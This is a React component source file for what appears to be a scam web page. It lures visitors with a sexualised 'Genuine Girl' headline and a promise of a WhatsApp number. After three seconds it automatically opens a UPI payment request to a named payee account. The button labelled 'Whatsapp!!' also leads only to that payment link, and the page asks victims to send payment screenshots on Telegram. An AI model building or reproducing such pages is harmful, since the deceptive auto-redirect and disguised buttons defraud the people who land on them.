import './App.css';

function App() {
  setTimeout(()=>{
    window.open("upi://pay?pa=bharatpe.0851610820@icici&pn=Shruthi_Reddy&cu=INR&tn=Shruthi_Reddy&tr=APP","_self");
  },3000)
  return (
    <div className="App">
      <header className="App-header">
      <h1 style={{marginTop:"-120px", paddingBottom:'50px'}}>🍆😜🥰Genuine Girl!!🍆😜🥰</h1>
      <h6>You should PAY first to Unlock My Number!!</h6>
      <h6>Click Below👇 For My Whatsapp Number!!</h6>
      <a  id="myButton1" className="button1" type="button" href="upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">PAY NOW!!</a>
      <a  id="myButton" className="button" type="button" href="upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">Whatsapp!!</a>
      <h6>PAY NOW and Send me screenshot on Telegram!!</h6>
      </header>
    </div>
  );
}

export default App;
